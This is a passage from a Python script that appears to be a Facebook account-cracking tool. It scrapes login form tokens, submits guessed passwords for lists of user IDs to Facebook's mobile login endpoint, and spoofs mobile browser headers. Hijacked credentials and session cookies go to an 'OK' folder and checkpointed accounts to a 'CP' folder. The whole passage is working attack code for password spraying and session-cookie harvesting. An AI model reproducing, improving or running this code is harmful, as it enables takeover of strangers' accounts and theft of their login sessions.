			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} -- {cektahun(idf)}{x}\n{ua}{N}\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} - {cektahun(idf)}\n{kukis}\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
